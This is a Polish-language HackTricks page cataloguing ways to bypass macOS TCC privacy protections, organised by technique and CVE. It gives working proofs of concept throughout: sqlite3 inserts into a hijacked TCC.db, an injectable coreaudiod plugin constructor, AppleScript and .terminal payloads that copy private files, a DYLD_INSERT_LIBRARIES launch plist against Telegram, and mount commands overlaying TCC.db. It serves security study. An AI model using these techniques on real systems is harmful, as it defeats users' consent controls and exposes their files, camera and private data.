# macOS TCC Bypassy

{{#include ../../../../../banners/hacktricks-training.md}}

## Według funkcjonalności

### Bypass zapisu

To nie jest bypass, to po prostu sposób działania TCC: **Nie chroni przed zapisem**. Jeśli Terminal **nie ma dostępu do odczytu pulpitu użytkownika, nadal może do niego zapisywać**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Rozszerzony atrybut `com.apple.macl`** jest dodawany do nowego **pliku**, aby dać dostęp do jego odczytu **aplikacji twórcy**.

### TCC ClickJacking

Możliwe jest **umieszczenie okna nad monitorem TCC**, aby użytkownik **zaakceptował** to bez zauważenia. Możesz znaleźć PoC w [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Żądanie TCC przez dowolną nazwę

Atakujący może **tworzyć aplikacje z dowolną nazwą** (np. Finder, Google Chrome...) w **`Info.plist`** i sprawić, aby żądała dostępu do chronionej lokalizacji TCC. Użytkownik pomyśli, że to legalna aplikacja żąda tego dostępu.\
Co więcej, możliwe jest **usunięcie legalnej aplikacji z Docka i umieszczenie na nim fałszywej**, więc gdy użytkownik kliknie na fałszywą (która może używać tego samego ikony), może wywołać legalną, poprosić o uprawnienia TCC i uruchomić złośliwe oprogramowanie, sprawiając, że użytkownik uwierzy, że to legalna aplikacja żądała dostępu.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Więcej informacji i PoC w:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### Bypass SSH

Domyślnie dostęp przez **SSH miał "Pełny dostęp do dysku"**. Aby to wyłączyć, musisz mieć to wymienione, ale wyłączone (usunięcie go z listy nie usunie tych uprawnień):

![](<../../../../../images/image (1077).png>)

Tutaj możesz znaleźć przykłady, jak niektóre **złośliwe oprogramowania mogły obejść tę ochronę**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Zauważ, że teraz, aby móc włączyć SSH, potrzebujesz **Pełnego dostępu do dysku**

### Obsługa rozszerzeń - CVE-2022-26767

Atrybut **`com.apple.macl`** jest nadawany plikom, aby dać **pewnej aplikacji uprawnienia do jego odczytu.** Ten atrybut jest ustawiany, gdy **przeciągasz i upuszczasz** plik na aplikację lub gdy użytkownik **kliknie dwukrotnie** plik, aby otworzyć go w **domyślnej aplikacji**.

Dlatego użytkownik mógłby **zarejestrować złośliwą aplikację** do obsługi wszystkich rozszerzeń i wywołać usługi uruchamiania, aby **otworzyć** dowolny plik (więc złośliwy plik uzyska dostęp do jego odczytu).

### iCloud

Uprawnienie **`com.apple.private.icloud-account-access`** umożliwia komunikację z **`com.apple.iCloudHelper`** usługą XPC, która **dostarczy tokeny iCloud**.

**iMovie** i **Garageband** miały to uprawnienie i inne, które to umożliwiały.

Aby uzyskać więcej **informacji** na temat eksploitu w celu **uzyskania tokenów iCloud** z tego uprawnienia, sprawdź wykład: [**#OBTS v5.0: "Co się dzieje na twoim Macu, zostaje na iCloud Apple'a?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatyzacja

Aplikacja z uprawnieniem **`kTCCServiceAppleEvents`** będzie mogła **kontrolować inne aplikacje**. Oznacza to, że mogłaby **nadużywać uprawnień przyznanych innym aplikacjom**.

Aby uzyskać więcej informacji na temat skryptów Apple, sprawdź:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na przykład, jeśli aplikacja ma **uprawnienia automatyzacji nad `iTerm`**, na przykład w tym przykładzie **`Terminal`** ma dostęp do iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Nad iTerm

Terminal, który nie ma FDA, może wywołać iTerm, który je ma, i użyć go do wykonywania działań:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Over Finder

Lub jeśli aplikacja ma dostęp do Findera, może to być skrypt taki jak ten:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Zachowanie aplikacji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Demon **tccd** w przestrzeni użytkownika używał zmiennej **`HOME`** **env** do uzyskania dostępu do bazy danych użytkowników TCC z: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Zgodnie z [tym postem na Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i ponieważ demon TCC działa za pośrednictwem `launchd` w obrębie domeny bieżącego użytkownika, możliwe jest **kontrolowanie wszystkich zmiennych środowiskowych** przekazywanych do niego.\
W ten sposób **atakujący mógłby ustawić zmienną środowiskową `$HOME`** w **`launchctl`**, aby wskazywała na **kontrolowany** **katalog**, **zrestartować** **demon TCC** i następnie **bezpośrednio zmodyfikować bazę danych TCC**, aby nadać sobie **wszystkie dostępne uprawnienia TCC** bez wywoływania monitów dla końcowego użytkownika.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notatki

Notatki miały dostęp do lokalizacji chronionych przez TCC, ale gdy notatka jest tworzona, jest **tworzona w niechronionej lokalizacji**. Można więc poprosić notatki o skopiowanie chronionego pliku do notatki (czyli w niechronionej lokalizacji) i następnie uzyskać dostęp do pliku:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokacja

Binarne `/usr/libexec/lsd` z biblioteką `libsecurity_translocate` miało uprawnienie `com.apple.private.nullfs_allow`, co pozwalało na utworzenie **nullfs** montażu i miało uprawnienie `com.apple.private.tcc.allow` z **`kTCCServiceSystemPolicyAllFiles`**, aby uzyskać dostęp do każdego pliku.

Można było dodać atrybut kwarantanny do "Biblioteki", wywołać usługę XPC **`com.apple.security.translocation`**, a następnie mapować Bibliotekę do **`$TMPDIR/AppTranslocation/d/d/Library`**, gdzie wszystkie dokumenty w Bibliotece mogły być **dostępne**.

### CVE-2023-38571 - Muzyka i TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Muzyka`** ma interesującą funkcję: Gdy jest uruchomiona, **importuje** pliki wrzucone do **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** do "biblioteki multimedialnej" użytkownika. Ponadto wywołuje coś w rodzaju: **`rename(a, b);`**, gdzie `a` i `b` to:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

To **`rename(a, b);`** zachowanie jest podatne na **Race Condition**, ponieważ możliwe jest umieszczenie w folderze `Automatically Add to Music.localized` fałszywego pliku **TCC.db**, a następnie, gdy nowy folder (b) jest tworzony, skopiowanie pliku, usunięcie go i skierowanie go do **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Jeśli **`SQLITE_SQLLOG_DIR="path/folder"`**, oznacza to zasadniczo, że **każda otwarta baza danych jest kopiowana do tej ścieżki**. W tym CVE kontrola ta została nadużyta do **zapisu** wewnątrz **bazy danych SQLite**, która ma być **otwarta przez proces z FDA bazą danych TCC**, a następnie nadużycie **`SQLITE_SQLLOG_DIR`** z **symlinkiem w nazwie pliku**, tak że gdy ta baza danych jest **otwarta**, użytkownik **TCC.db jest nadpisywany** otwartą.\
**Więcej informacji** [**w opisie**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **i**[ **w prezentacji**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Jeśli zmienna środowiskowa **`SQLITE_AUTO_TRACE`** jest ustawiona, biblioteka **`libsqlite3.dylib`** zacznie **rejestrować** wszystkie zapytania SQL. Wiele aplikacji korzystało z tej biblioteki, więc możliwe było rejestrowanie wszystkich ich zapytań SQLite.

Kilka aplikacji Apple korzystało z tej biblioteki, aby uzyskać dostęp do informacji chronionych przez TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Ta **zmienna środowiskowa jest używana przez framework `Metal`**, który jest zależnością dla różnych programów, w szczególności `Music`, który ma FDA.

Ustawiając następujące: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Jeśli `path` jest ważnym katalogiem, błąd zostanie wywołany i możemy użyć `fs_usage`, aby zobaczyć, co się dzieje w programie:

- plik zostanie `open()`ed, nazwany `path/.dat.nosyncXXXX.XXXXXX` (X jest losowe)
- jeden lub więcej `write()` zapisze zawartość do pliku (nie kontrolujemy tego)
- `path/.dat.nosyncXXXX.XXXXXX` zostanie `renamed()`d na `path/name`

To jest tymczasowe zapisanie pliku, po którym następuje **`rename(old, new)`**, **co nie jest bezpieczne.**

Nie jest to bezpieczne, ponieważ musi **rozwiązać stare i nowe ścieżki osobno**, co może zająć trochę czasu i może być podatne na warunki wyścigu. Więcej informacji można znaleźć w funkcji `xnu` `renameat_internal()`.

> [!CAUTION]
> Więc, zasadniczo, jeśli proces z uprawnieniami zmienia nazwę z folderu, który kontrolujesz, możesz uzyskać RCE i sprawić, że uzyska dostęp do innego pliku lub, jak w tym CVE, otworzyć plik, który utworzył aplikacja z uprawnieniami i przechować FD.
>
> Jeśli zmiana nazwy uzyskuje dostęp do folderu, który kontrolujesz, podczas gdy zmodyfikowałeś plik źródłowy lub masz do niego FD, zmieniasz plik docelowy (lub folder), aby wskazywał na symlink, więc możesz pisać, kiedy chcesz.

To był atak w tym CVE: Na przykład, aby nadpisać `TCC.db` użytkownika, możemy:

- utworzyć `/Users/hacker/ourlink`, aby wskazywał na `/Users/hacker/Library/Application Support/com.apple.TCC/`
- utworzyć katalog `/Users/hacker/tmp/`
- ustawić `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- wywołać błąd, uruchamiając `Music` z tą zmienną środowiskową
- przechwycić `open()` `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X jest losowe)
- tutaj również `open()` ten plik do zapisu i trzymamy uchwyt do deskryptora pliku
- atomowo zamienić `/Users/hacker/tmp` z `/Users/hacker/ourlink` **w pętli**
- robimy to, aby zmaksymalizować nasze szanse na sukces, ponieważ okno wyścigu jest dość wąskie, ale przegranie wyścigu ma znikome negatywne skutki
- poczekać chwilę
- sprawdzić, czy mieliśmy szczęście
- jeśli nie, uruchomić ponownie od początku

Więcej informacji w [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Teraz, jeśli spróbujesz użyć zmiennej środowiskowej `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacje nie uruchomią się

### Apple Remote Desktop

Jako root możesz włączyć tę usługę, a **agent ARD będzie miał pełny dostęp do dysku**, co może być nadużywane przez użytkownika, aby skopiować nową **bazę danych użytkowników TCC**.

## Przez **NFSHomeDirectory**

TCC używa bazy danych w folderze HOME użytkownika do kontrolowania dostępu do zasobów specyficznych dla użytkownika w **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Dlatego, jeśli użytkownik zdoła ponownie uruchomić TCC z zmienną środowiskową $HOME wskazującą na **inny folder**, użytkownik może utworzyć nową bazę danych TCC w **/Library/Application Support/com.apple.TCC/TCC.db** i oszukać TCC, aby przyznać dowolne uprawnienia TCC dowolnej aplikacji.

> [!TIP]
> Zauważ, że Apple używa ustawienia przechowywanego w profilu użytkownika w atrybucie **`NFSHomeDirectory`** dla **wartości `$HOME`**, więc jeśli skompromitujesz aplikację z uprawnieniami do modyfikacji tej wartości (**`kTCCServiceSystemPolicySysAdminFiles`**), możesz **uzbroić** tę opcję z obejściem TCC.

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Pierwszy POC** używa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), aby zmodyfikować **folder HOME** użytkownika.

1. Uzyskaj blob _csreq_ dla docelowej aplikacji.
2. Zasiej fałszywy plik _TCC.db_ z wymaganym dostępem i blobem _csreq_.
3. Eksportuj wpis usług katalogowych użytkownika za pomocą [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Zmodyfikuj wpis usług katalogowych, aby zmienić katalog domowy użytkownika.
5. Importuj zmodyfikowany wpis usług katalogowych za pomocą [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zatrzymaj _tccd_ użytkownika i zrestartuj proces.

Drugi POC użył **`/usr/libexec/configd`**, który miał `com.apple.private.tcc.allow` z wartością `kTCCServiceSystemPolicySysAdminFiles`.\
Możliwe było uruchomienie **`configd`** z opcją **`-t`**, atakujący mógł określić **niestandardowy pakiet do załadowania**. Dlatego exploit **zastępuje** metodę **`dsexport`** i **`dsimport`** zmiany katalogu domowego użytkownika za pomocą **wstrzyknięcia kodu configd**.

Więcej informacji można znaleźć w [**oryginalnym raporcie**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Przez wstrzyknięcie procesu

Istnieją różne techniki wstrzykiwania kodu do procesu i nadużywania jego uprawnień TCC:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ponadto najczęstszym wstrzyknięciem procesu, aby obejść TCC, są **pluginy (ładuj bibliotekę)**.\
Pluginy to dodatkowy kod, zazwyczaj w formie bibliotek lub plist, które będą **ładowane przez główną aplikację** i będą wykonywane w jej kontekście. Dlatego, jeśli główna aplikacja miała dostęp do plików ograniczonych przez TCC (poprzez przyznane uprawnienia lub uprawnienia), **niestandardowy kod również je będzie miał**.

### CVE-2020-27937 - Directory Utility

Aplikacja `/System/Library/CoreServices/Applications/Directory Utility.app` miała uprawnienie **`kTCCServiceSystemPolicySysAdminFiles`**, ładowała pluginy z rozszerzeniem **`.daplug`** i **nie miała wzmocnionego** czasu wykonywania.

Aby uzbroić ten CVE, **`NFSHomeDirectory`** jest **zmieniane** (nadużywając poprzedniego uprawnienia), aby móc **przejąć bazę danych TCC użytkowników** w celu obejścia TCC.

Więcej informacji można znaleźć w [**oryginalnym raporcie**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binarny **`/usr/sbin/coreaudiod`** miał uprawnienia `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Pierwsze **pozwala na wstrzyknięcie kodu**, a drugie daje dostęp do **zarządzania TCC**.

Ten binarny plik pozwalał na ładowanie **pluginów stron trzecich** z folderu `/Library/Audio/Plug-Ins/HAL`. Dlatego możliwe było **załadowanie pluginu i nadużycie uprawnień TCC** z tym PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Dla uzyskania dodatkowych informacji sprawdź [**oryginalny raport**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Wtyczki warstwy abstrakcji urządzeń (DAL)

Aplikacje systemowe, które otwierają strumień kamery za pomocą Core Media I/O (aplikacje z **`kTCCServiceCamera`**) ładują **w procesie te wtyczki** znajdujące się w `/Library/CoreMediaIO/Plug-Ins/DAL` (nie są ograniczone przez SIP).

Samo przechowywanie tam biblioteki z wspólnym **konstruktorem** wystarczy, aby **wstrzyknąć kod**.

Kilka aplikacji Apple było na to podatnych.

### Firefox

Aplikacja Firefox miała uprawnienia `com.apple.security.cs.disable-library-validation` oraz `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Aby uzyskać więcej informacji na temat łatwego wykorzystania tego [**sprawdź oryginalny raport**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Plik binarny `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` miał uprawnienia **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, co pozwalało na wstrzykiwanie kodu do procesu i korzystanie z uprawnień TCC.

### CVE-2023-26818 - Telegram

Telegram miał uprawnienia **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, więc możliwe było nadużycie tego, aby **uzyskać dostęp do jego uprawnień**, takich jak nagrywanie za pomocą kamery. Możesz [**znaleźć ładunek w opisie**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Zauważ, jak użyć zmiennej env do załadowania biblioteki, stworzono **niestandardowy plist**, aby wstrzyknąć tę bibliotekę, a **`launchctl`** został użyty do jej uruchomienia:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Poprzez otwarte wywołania

Możliwe jest wywołanie **`open`** nawet w trybie piaskownicy

### Skrypty terminala

Jest to dość powszechne, aby przyznać terminalowi **Pełny dostęp do dysku (FDA)**, przynajmniej w komputerach używanych przez osoby techniczne. I możliwe jest wywołanie skryptów **`.terminal`** z jego użyciem.

Skrypty **`.terminal`** to pliki plist, takie jak ten, z poleceniem do wykonania w kluczu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacja mogłaby napisać skrypt terminalowy w lokalizacji takiej jak /tmp i uruchomić go za pomocą polecenia takiego jak:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Przez montowanie

### CVE-2020-9771 - obejście TCC mount_apfs i eskalacja uprawnień

**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować migawkę Time Machine oraz **uzyskać dostęp do WSZYSTKICH plików** tej migawki.\
**Jedynym wymaganym** uprawnieniem jest to, aby aplikacja używana (jak `Terminal`) miała **Pełny dostęp do dysku** (FDA) (`kTCCServiceSystemPolicyAllfiles`), co musi być przyznane przez administratora.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Bardziej szczegółowe wyjaśnienie można [**znaleźć w oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montowanie nad plikiem TCC

Nawet jeśli plik bazy danych TCC jest chroniony, możliwe było **zamontowanie nowego pliku TCC.db nad katalogiem**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Sprawdź **pełny exploit** w [**oryginalnym opisie**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Jak wyjaśniono w [oryginalnym opisie](https://www.kandji.io/blog/macos-audit-story-part2), ten CVE wykorzystał `diskarbitrationd`.

Funkcja `DADiskMountWithArgumentsCommon` z publicznego frameworka `DiskArbitration` przeprowadzała kontrole bezpieczeństwa. Jednak możliwe jest jej obejście poprzez bezpośrednie wywołanie `diskarbitrationd`, a tym samym użycie elementów `../` w ścieżce i dowiązań symbolicznych.

To pozwoliło atakującemu na wykonywanie dowolnych montażów w dowolnej lokalizacji, w tym nad bazą danych TCC z powodu uprawnienia `com.apple.private.security.storage-exempt.heritable` `diskarbitrationd`.

### asr

Narzędzie **`/usr/sbin/asr`** pozwalało na skopiowanie całego dysku i zamontowanie go w innym miejscu, omijając zabezpieczenia TCC.

### Usługi lokalizacyjne

Istnieje trzecia baza danych TCC w **`/var/db/locationd/clients.plist`**, aby wskazać klientów, którzy mają **dostęp do usług lokalizacyjnych**.\
Folder **`/var/db/locationd/` nie był chroniony przed montowaniem DMG**, więc możliwe było zamontowanie naszego własnego plist.

## Poprzez aplikacje uruchamiane przy starcie

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Poprzez grep

W kilku przypadkach pliki będą przechowywać wrażliwe informacje, takie jak e-maile, numery telefonów, wiadomości... w niechronionych lokalizacjach (co liczy się jako luka w Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Syntetyczne kliknięcia

To już nie działa, ale [**działało w przeszłości**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Inny sposób wykorzystujący [**zdarzenia CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referencje

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Sposobów na Ominięcie Mechanizmów Prywatności macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NOWYCH Sposobów na Ominięcie Mechanizmów Prywatności macOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
